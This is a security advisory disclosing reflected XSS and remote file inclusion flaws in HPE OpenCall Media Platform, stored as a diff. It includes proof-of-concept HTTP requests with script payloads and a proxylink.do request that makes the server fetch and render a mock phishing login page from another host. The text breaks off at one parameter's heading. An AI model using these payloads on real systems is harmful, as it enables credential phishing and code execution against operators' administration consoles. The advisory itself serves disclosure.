@@ -1,0 +1,1046 @@
+Source: https://blogs.securiteam.com/index.php/archives/3087
+
+SSD Advisory – HPE OpenCall Media Platform (OCMP) Multiple Vulnerabilities
+
+Want to get paid for a vulnerability similar to this one?
+Contact us at: ssd@beyondsecurity.com
+
+Vulnerabilities Summary
+The following advisory describes Reflected Cross-Site Scripting (XSS)
+vulnerabilities and a Remote File Inclusion vulnerability that when
+combined can lead to Code Execution, were found in HP OpenCall Media
+Platform (OCMP), version 4.3.2.
+
+HPE OpenCall Media Platform (OCMP) is a suite of software and hardware
+applications which allow implementation of common telecom operator
+services such as voicemail, sms (short message service), prepaid,
+billing, hlr, etc. It implements industry standard telecom protocols
+and standards such as SS7, ISUP, TCAP, SIP, MRCP, RTSP, and VoiceXML.
+
+HPE OpenCall Media Platform offers a highly scalable, easy-to-manage,
+carrier-grade media platform that adapts to future networks and
+applications. Through its strong support of open standards and
+protocols, new applications can be rapidly developed and deployed in a
+way that preserves investments and reduces capital expenditures
+(CAPEX) and operational expenditure (OPEX).
+
+There are 3 different components that are vulnerable in HPE OpenCall
+Media Platform (OCMP), and for each component has the following
+vulnerabilities:
+
+Application Content Manager
+
+Reflected Cross-Site Scripting (XSS) – /mcm/resources/
+
+
+Platform Administration Tool
+
+Reflected Cross-Site Scripting (XSS) that lead to Remote Code Execution
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, LEV_TYPE0 parameter
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, LEV_TYPE1 parameter
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, LEV_TYPE2 parameter
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, LEV_TYPE3 parameter
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, LEV_NAME0 parameter
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, LEV_NAME1 parameter
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, LEV_NAME2 parameter
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, LEV_NAME3 parameter
+Reflected Cross-Site Scripting (XSS) – GetMapAction function
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, LEV_NUM parameter
+Reflected Cross-Site Scripting (XSS) – GetMapAction function, NAME parameter
+Reflected Cross-Site Scripting (XSS) – cdrdispatch function, next parameter
+Reflected Cross-Site Scripting (XSS) – cdrdispatch function, sessionType parameter
+
+
+VoiceXML Administration Tool
+
+Reflected Cross-Site Scripting (XSS) – event.do function
+Reflected Cross-Site Scripting (XSS) – call.do function
+Remote File Inclusion – proxylink.do function
+
+
+Credit
+An independent security researcher Paolo Stagno from VoidSec has
+reported this vulnerability to Beyond Security’s SecuriTeam Secure
+Disclosure program.
+
+Vendor Responses
+HPE has released patches to address this vulnerability, for more details see:
+https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbgn03686en_us
+
+Vulnerabilities Details
+
+Application Content Manager – /mcm/resources/
+HPE OpenCall Media Platform (OCMP) does not sanitize /mcm/resources/
+“description” and “prototype” parameters input. An attacker can inject
+malicious Java script to trigger the Reflected Cross-Site Scripting
+(XSS).
+
+Proof of Concept
+
+An Attacker send the following POST request to the victims machine :
+
+
+POST https://127.0.0.1:8443/mcm/resources/dummy_test/dummy/test?followindirection=false
+HTTP/1.1
+Host: 127.0.0.1:8443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Content-Type: application/mcm+json; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://127.0.0.1:8443/mcm/tenant/mcmcontent.html
+Content-Length: 54
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+{ "": "", "description": "<script>alert(1);</script>"}
+
+The server will respond with:
+
+HTTP/1.1 204 No Content
+X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1
+Date: Wed, 23 Sep 2015 16:13:35 GMT
+Server: Web Server
+
+Then the attacker will send the second request to trigger the
+Cross-Site Scripting (XSS):
+
+GET https://127.0.0.1:8443/mcm/resources/dummy_test/dummy/test?format=json&followindirection=false&ms=1443024815924
+HTTP/1.1
+Host: 127.0.0.1:8443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+X-Requested-With: XMLHttpRequest
+Referer: https://127.0.0.1:8443/mcm/tenant/mcmcontent.html
+Connection: keep-alive
+
+The server will respond with:
+
+HTTP/1.1 200 OK
+X-Powered-By: Servlet 2.5; JBoss-5.0/JBossWeb-2.1
+Cache-control: no-cache
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Wed, 23 Sep 2015 16:13:35 GMT
+Server: Web Server
+
+
+VoiceXML Administration Tool – call.do function
+HPE OpenCall Media Platform (OCMP) does not sanitize call.do function
+parameters input. An attacker can inject malicious Java script to
+trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL: /om/call.do?action=list_calls&type=XSS_HERE
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /om/call.do?action=list_calls&type=Active637a3<script>alert(1)<%2fscript>c7e9f
+HTTP/1.1
+Accept: text/html, application/xhtml+xml, */*
+Referer: https://127.0.0.1:5443/om/servicegroup.do?action=addservicegroup
+Accept-Language: en-GB
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: 127.0.0.1:5443
+DNT: 1
+Connection: Keep-Alive
+Cookie: JSESSIONID=5F9196107A3454133D4190CDB086E03B
+
+The server will respond with:
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Pragma: No-cache
+Cache-Control: no-cache,no-store
+Expires: Thu, 01 Jan 1970 01:00:00 GMT
+Content-Type: text/html;charset=ISO-8859-1
+Date: Thu, 10 Sep 2015 13:30:41 GMT
+Content-Length: 10418
+
+
+<HTML>
+<HEAD>
+<TITLE>VoiceXML Environment Operation and Maintenance on tb0ocmp0</TITLE>
+<LINK REL="stylesheet"
+HREF="consolepages/templates/stylesheets/style.css" TYPE="text/css">
+</HEAD>
+
+<BODY>
+<script type="text/javascript">
+
+//HV Menu v5- by Ger Versluis (www.burmees.nl)
+//Submitted to Dynamic Drive (www.dynamicdrive.com)
+//Visit www.dynamicdrive.com for this script and more
+
+function Go(){return}
+
+</script>
+<script type="text/javascript"
+src="consolepages/templates/js/exmplmenu_var.jsp"></script>
+<script type="text/javascript"
+src="consolepages/templates/js/menu_com.js"></script>
+<noscript>Your browser does not support script</noscript>
+
+<TABLE WIDTH="800" BORDER="0">
+<TR>
+<TD><IMG SRC="consolepages/templates/images/speechweb.gif"/></TD>
+</TR>
+<TR>
+
+<TD VALIGN="top">
+Logged on as: zerpsta1 <SPAN id="warn"> &nbsp; &nbsp; &nbsp; &nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp;      </SPAN>
+<BR><BR><BR><BR>
+
+
+<br>
+<b>Call Management -> Active637a3<script>alert(1)</script>c7e9f Calls</b>
+
+<br><br><br>
+
+<table border="1" width="1000">
+<tr><td colspan="12" class="tableheader">Calls <a href="#"><img
+src="consolepages/templates/images/questionmark.gif" border="0"
+onClick="window.open('help.do?prompt=p20', 'help',
+'toolbar=no,width=400,height=400,resizable=no,scrollbars=yes');"></a></td></tr>
+<tr><td colspan="12">&nbsp;</td></tr>
+<tr>
+<td><b><a href=call.do?action=sort_calls&type=node>Server Id</a></b></td>
+<td><b><a href=call.do?action=sort_calls&type=callid>CallId</a></b></td>
+<td><b>CDR</b></td>
+<td><b>Call Monitoring</b></td>
+<td><b>Service Id</b></td>
+<td><b><a href=call.do?action=sort_calls&type=ruri>Remote-URI</a></b></td>
+<td><b><a href=call.do?action=sort_calls&type=luri>Local-URI</a></b></td>
+<td><b><a href=call.do?action=sort_calls&type=severe>Severes</a></b></td>
+<td><b><a href=call.do?action=sort_calls&type=warning>Warnings</a></b></td>
+<td><b><a href=call.do?action=sort_calls&type=vxml_exception>VoiceXML
+Exceptions</a></b></td>
+<td><b><a href=call.do?action=sort_calls&type=time>Started At</a></b></td>
+
+<td><b>Duration</b></td>
+
+
+</tr>
+
+
+
+    <tr bgcolor="eeeeee">
+
+    <td>tb0ocmp1</td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp1%3A5443%2Fmit%2Flogs%2Fcallids%2Fvxi_dialog_0_32_634_3%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13&contenttype=text/html"
+target="_new">vxi_dialog_0_32_634_3</a></td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp1%3A5443%2Fmit%2Fsystem%2Fcdr%2Fvxi_dialog_0_32_634_3%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13"
+target="_new">CDR</a></td>
+    <td><a href="call.do?action=monitor&cid=vxi_dialog_0_32_634_3&node=tb0ocmp1">Monitor</a></td>
+
+    <td><a href="service.do?action=update&id=o2_ivr_0xxx">o2_ivr_0xxx</a></td>
+
+    <td>sip:unavailable@unknown.invalid</td>
+    <td>+1542000470521123</td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_3&type=ERROR
+target="new">1</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_3&type=WARN
+target="new">0</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_3&type=vxml_exception
+target="new">21</a></td>
+    <td>150909 19:00:52.429</td><td>00:00:00.502</td>
+
+    </tr>
+
+
+    <tr>
+
+    <td>tb0ocmp0</td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp0%3A5443%2Fmit%2Flogs%2Fcallids%2Fvxi_dialog_0_40_420_2%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13&contenttype=text/html"
+target="_new">vxi_dialog_0_40_420_2</a></td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp0%3A5443%2Fmit%2Fsystem%2Fcdr%2Fvxi_dialog_0_40_420_2%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13"
+target="_new">CDR</a></td>
+    <td><a href="call.do?action=monitor&cid=vxi_dialog_0_40_420_2&node=tb0ocmp0">Monitor</a></td>
+
+    <td><a href="service.do?action=update&id=o2_ivr_0xxx">o2_ivr_0xxx</a></td>
+
+    <td>sip:unavailable@unknown.invalid</td>
+    <td>+1542000470174023</td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_40_420_2&type=ERROR
+target="new">1</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_40_420_2&type=WARN
+target="new">0</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_40_420_2&type=vxml_exception
+target="new">21</a></td>
+    <td>150908 19:29:05.236</td><td>00:00:00.501</td>
+
+    </tr>
+
+
+    <tr bgcolor="eeeeee">
+
+    <td>tb0ocmp1</td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp1%3A5443%2Fmit%2Flogs%2Fcallids%2Fvxi_dialog_0_32_634_2%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13&contenttype=text/html"
+target="_new">vxi_dialog_0_32_634_2</a></td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp1%3A5443%2Fmit%2Fsystem%2Fcdr%2Fvxi_dialog_0_32_634_2%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13"
+target="_new">CDR</a></td>
+    <td><a href="call.do?action=monitor&cid=vxi_dialog_0_32_634_2&node=tb0ocmp1">Monitor</a></td>
+
+    <td><a href="service.do?action=update&id=o2_ivr_0xxx">o2_ivr_0xxx</a></td>
+
+    <td>sip:unavailable@unknown.invalid</td>
+    <td>+1542000470852423</td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_2&type=ERROR
+target="new">1</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_2&type=WARN
+target="new">0</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_2&type=vxml_exception
+target="new">21</a></td>
+    <td>150908 19:27:56.237</td><td>00:00:01.003</td>
+
+    </tr>
+
+    <tr>
+
+    <td>tb0ocmp0</td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp0%3A5443%2Fmit%2Flogs%2Fcallids%2Fvxi_dialog_0_40_420_1%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13&contenttype=text/html"
+target="_new">vxi_dialog_0_40_420_1</a></td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp0%3A5443%2Fmit%2Fsystem%2Fcdr%2Fvxi_dialog_0_40_420_1%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13"
+target="_new">CDR</a></td>
+    <td><a href="call.do?action=monitor&cid=vxi_dialog_0_40_420_1&node=tb0ocmp0">Monitor</a></td>
+
+    <td><a href="service.do?action=update&id=o2_ivr_0xxx">o2_ivr_0xxx</a></td>
+
+    <td>sip:unavailable@unknown.invalid</td>
+    <td>+1542000470632723</td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_40_420_1&type=ERROR
+target="new">1</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_40_420_1&type=WARN
+target="new">0</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_40_420_1&type=vxml_exception
+target="new">21</a></td>
+    <td>150907 18:57:21.548</td><td>00:00:01.004</td>
+
+    </tr>
+
+    <tr bgcolor="eeeeee">
+
+    <td>tb0ocmp1</td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp1%3A5443%2Fmit%2Flogs%2Fcallids%2Fvxi_dialog_0_32_634_1%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13&contenttype=text/html"
+target="_new">vxi_dialog_0_32_634_1</a></td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp1%3A5443%2Fmit%2Fsystem%2Fcdr%2Fvxi_dialog_0_32_634_1%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13"
+target="_new">CDR</a></td>
+    <td><a href="call.do?action=monitor&cid=vxi_dialog_0_32_634_1&node=tb0ocmp1">Monitor</a></td>
+
+    <td><a href="service.do?action=update&id=o2_ivr_0xxx">o2_ivr_0xxx</a></td>
+
+    <td>sip:unavailable@unknown.invalid</td>
+    <td>+1542000470277023</td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_1&type=ERROR
+target="new">1</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_1&type=WARN
+target="new">0</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_1&type=vxml_exception
+target="new">21</a></td>
+    <td>150907 15:13:19.660</td><td>00:00:01.003</td>
+
+    </tr>
+
+    <tr>
+    <td>tb0ocmp0</td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp0%3A5443%2Fmit%2Flogs%2Fcallids%2Fvxi_dialog_0_40_420_0%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13&contenttype=text/html"
+target="_new">vxi_dialog_0_40_420_0</a></td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp0%3A5443%2Fmit%2Fsystem%2Fcdr%2Fvxi_dialog_0_40_420_0%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13"
+target="_new">CDR</a></td>
+    <td><a href="call.do?action=monitor&cid=vxi_dialog_0_40_420_0&node=tb0ocmp0">Monitor</a></td>
+
+    <td><a href="service.do?action=update&id=o2_ivr_0xxx">o2_ivr_0xxx</a></td>
+
+    <td>sip:unavailable@unknown.invalid</td>
+    <td>+1542000470860823</td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_40_420_0&type=ERROR
+target="new">1</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_40_420_0&type=WARN
+target="new">0</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_40_420_0&type=vxml_exception
+target="new">21</a></td>
+    <td>150907 15:12:15.254</td><td>00:00:00.501</td>
+
+
+    </tr>
+
+
+
+    <tr bgcolor="eeeeee">
+
+    <td>tb0ocmp0</td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp0%3A5443%2Fmit%2Flogs%2Fcallids%2Fvxi_dialog_0_32_634_0%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13&contenttype=text/html"
+target="_new">vxi_dialog_0_32_634_0</a></td>
+
+    <td><a href="proxylink.do?url=https%3A%2F%2Ftb0ocmp0%3A5443%2Fmit%2Fsystem%2Fcdr%2Fvxi_dialog_0_32_634_0%3FmultinodeUser%3Docadmin%26clusterID%3D7A2C87ED7D79EE7644287C3B4151FB13"
+target="_new">CDR</a></td>
+    <td><a href="call.do?action=monitor&cid=vxi_dialog_0_32_634_0&node=tb0ocmp0">Monitor</a></td>
+
+    <td><a href="service.do?action=update&id=o2_ivr_3xxx">o2_ivr_3xxx</a></td>
+
+    <td>sip:unavailable@unknown.invalid</td>
+    <td>+1540003000009388</td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_0&type=ERROR
+target="new">0</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_0&type=WARN
+target="new">0</a></td>
+    <td><a href=event.do?action=list&callid=vxi_dialog_0_32_634_0&type=vxml_exception
+target="new">0</a></td>
+    <td>150907 15:00:13.901</td><td>00:00:45.194</td>
+
+
+    </tr>
+
+
+
+
+
+</table>
+
+</TD>
+</TR>
+</TABLE>
+</BODY>
+</HTML>
+
+VoiceXML Administration Tool – event.do function
+HPE OpenCall Media Platform (OCMP) does not sanitize event.do function
+parameters input. An attacker can inject malicious Java script to
+trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL: /om/event.do?action=list&type=XSS_HERE
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /om/event.do?action=list&type=Active637a3<script>alert(1)<%2fscript>c7e9f
+HTTP/1.1
+Accept: text/html, application/xhtml+xml, */*
+Referer: https://172.27.116.32:5443/om/call.do?action=trace_calls&type=trace_calls
+Accept-Language: en-GB
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: 172.27.116.32:5443
+DNT: 1
+Connection: Keep-Alive
+Cookie: JSESSIONID=5F9196107A3454133D4190CDB086E03B
+
+The server will respond with:
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Pragma: No-cache
+Cache-Control: no-cache
+Expires: Thu, 01 Dec 1994 16:00:00 GMT
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 2437
+Date: Thu, 10 Sep 2015 13:32:55 GMT
+
+
+
+
+
+<HTML>
+<HEAD>
+<TITLE>VoiceXML Environment Operation and Maintenance on tb0ocmp0</TITLE>
+<LINK REL="stylesheet"
+HREF="consolepages/templates/stylesheets/style.css" TYPE="text/css">
+</HEAD>
+
+<BODY>
+<script type="text/javascript">
+
+//HV Menu v5- by Ger Versluis (www.burmees.nl)
+//Submitted to Dynamic Drive (www.dynamicdrive.com)
+//Visit www.dynamicdrive.com for this script and more
+
+function Go(){return}
+
+</script>
+<script type="text/javascript"
+src="consolepages/templates/js/exmplmenu_var.jsp"></script>
+<script type="text/javascript"
+src="consolepages/templates/js/menu_com.js"></script>
+<noscript>Your browser does not support script</noscript>
+
+<TABLE WIDTH="800" BORDER="0">
+<TR>
+<TD><IMG SRC="consolepages/templates/images/speechweb.gif"/></TD>
+</TR>
+<TR>
+
+<TD VALIGN="top">
+Logged on as: zerpsta1 <SPAN id="warn"> &nbsp; &nbsp; &nbsp; &nbsp;
+&nbsp; &nbsp; &nbsp; &nbsp;      </SPAN>
+<BR><BR><BR><BR>
+
+
+
+
+
+
+<script language="JavaScript">
+  function toggleVisibility( divId, buttonId ) {
+    if( document.all[divId].style.display == 'none' ) {
+      document.all[divId].style.display = 'inline';
+      document.all[buttonId].value = 'Hide Stacktrace';
+    } else {
+      document.all[divId].style.display = 'none';
+      document.all[buttonId].value = 'Show Stacktrace';
+    }
+  }
+</script>
+
+<br>
+<b>Active637a3<script>alert(1)</script>c7e9f</b>
+<br><br>
+
+
+<form action="event.do">
+<input type="submit" value="Reset" name="submit" onClick="return
+confirm('Are you sure you want to remove all
+Active637a3<script>alert(1)</script>c7e9f?')">
+<input type="hidden" name="action" value=reset >
+<input type="hidden" name="type"
+value="Active637a3<script>alert(1)</script>c7e9f">
+</form>
+<br><br>
+
+
+<table border="1" width="1200">
+<tr><td colspan="8" class="tableheader">Events <a href="#"><img
+src="consolepages/templates/images/questionmark.gif" border="0"
+onClick="window.open('help.do?prompt=p21', 'help',
+'toolbar=no,width=400,height=400,resizable=no,scrollbars=yes');"></a></td></tr>
+<tr><td colspan="8">&nbsp;</td></tr>
+<tr>
+<td><b><a href=event.do?action=sort&type=NODE >Server Id</a></b></td>
+<td><b><a href=event.do?action=sort&type=TIME >Date</a></b></td>
+<td><b><a href=event.do?action=sort&type=CALL >CallId</a></b></td>
+<td><b>CDR</b></td>
+<td><b>Service Id</b></td>
+<td><b>Message</b></td>
+</tr>
+
+<tr><td colspan="8">&nbsp;</td></tr>
+  <tr><td colspan="8">No Items Found</td></tr>
+
+</TD>
+</TR>
+</TABLE>
+</BODY>
+</HTML>
+
+VoiceXML Administration Tool – proxylink.do function
+HPE OpenCall Media Platform (OCMP) does not sanitize proxylink.do
+function parameters input. An attacker can inject malicious URL to
+including remote files. After the attacker include the file, the HPE
+OpenCall Media Platform will parse and execute the content of the
+file.
+
+The vulnerable URL: /om/proxylink.do?url=Remote File Inclusion Here (RFI)
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /om/proxylink.do?url=http://172.27.120.220:9595/fruuuuk.txt HTTP/1.1
+Accept: text/html, application/xhtml+xml, */*
+Accept-Language: en-GB
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Host: 172.27.116.32:5443
+DNT: 1
+Connection: Keep-Alive
+Cookie: JSESSIONID=5D8C311BBE2784FB2CE6DB970878D3CA
+
+The server will respond with:
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Pragma: No-cache
+Cache-Control: no-cache
+Expires: Thu, 01 Dec 1994 16:00:00 GMT
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 2565
+Date: Wed, 09 Sep 2015 13:00:53 GMT
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>PHISHING LOGIN PAGE</title>
+<meta http-equiv="Content-Type" content="text/html; charset=US-ASCII">
+<link rel="Shortcut Icon" href="/login/images/hp.ico">
+<script>
+function onLoginFornLoad() {
+    document.getElementById("txtUsername").focus();
+}
+</script>
+    <style type="text/css">
+        .style1
+        {
+            width: 290px;
+        }
+        .style2
+        {
+            width: 285px;
+        }
+    </style>
+</head>
+
+<body onload="onLoginFornLoad()">
+<h2>PHISHING LOGIN PAGE</h2>
+<script>document.write("I`m also running JS");</script>
+<form action="j_security_check" method="POST">
+<table cellpadding="0" cellspacing="0" width="100%" height="100%"
+style="background-color: #ffffff">
+<tr>
+    <td align="center" valign="middle">
+        <table cellpadding="0" cellspacing="0" height="309"
+                style="border: 1px solid #000000; background-position:
+left top; background-image:url('/login/images/hp_logo.png');
+background-repeat: no-repeat; width: 576px; clip: rect(1px, auto,
+auto, auto);" >
+        <tr>
+            <td class="style2">&nbsp;</td>
+            <td class="style1">
+<table cellpadding="0" cellspacing="0">
+                <tr>
+                    <td width="60"
+                            style="font-family: Arial, Helvetica,
+sans-serif; color: #000000; font-weight: bold">
+                            User&nbsp;Name&nbsp;&nbsp;</td>
+                    <td><input name="j_username" type="text" size="14"
+style="width: 193px;"
+                                id="txtUsername" value=""></td>
+                </tr>
+                <tr><td colspan="2" height="3"></td></tr>
+                <tr>
+                    <td style="font-family: Arial, Helvetica,
+sans-serif; font-weight: bold">Password&nbsp;</td>
+                    <td><input name="j_password" type="password"
+size="14" style="width: 191px"></td>
+                </tr>
+                <tr><td colspan="2" height="3"></td></tr>
+<tr><td colspan="2">&nbsp;</td></tr>
+                    <td colspan="2" align="right">
+                        <button type="submit"  value="Log in"
+style="width:54px; margin-top:8px">Login</button>
+                    </td>
+                </tr>
+                </table>
+            </td>
+            <td style="background-color: #FFFFFF">&nbsp;</td>
+        </tr>
+        </table>
+    </td>
+</tr>
+</table>
+</form>
+</body>
+</html>
+
+Platform Administration Tool – Reflected Cross-Site Scripting (XSS)
+that lead to Remote Code Execution
+HPE OpenCall Media Platform (OCMP) does not sanitize cdrdispatch
+function with parameter cmd=DisplayBaseCdrBrowsePage. An attacker can
+inject malicious Java script to trigger the Cross-Site Scripting
+(XSS).
+
+Proof of Concept
+An Attacker send the following GET request to the victims machine:
+
+GET /OCMPOAM/cdrdispatch?cmd=DisplayBaseCdrBrowsePagef5df3<script>alert(1)<%2fscript>1d8b4&sessionType=NONE
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFMonitorMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – LEV_TYPE0 parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter LEV_TYPE0 input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T021985″><script>alert(1)<
+%2fscript>0ca30&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine :
+
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T021985"><script>alert(1)<%2fscript>0ca30&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – LEV_TYPE1 parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter LEV_TYPE1 input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T14527a”><script>alert(1)<
+%2fscript>2d848&LEV_TYPE2=T2&LEV_TYPE3=T3
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine :
+
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T14527a"><script>alert(1)<%2fscript>2d848&LEV_TYPE2=T2&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – LEV_TYPE2 parameter
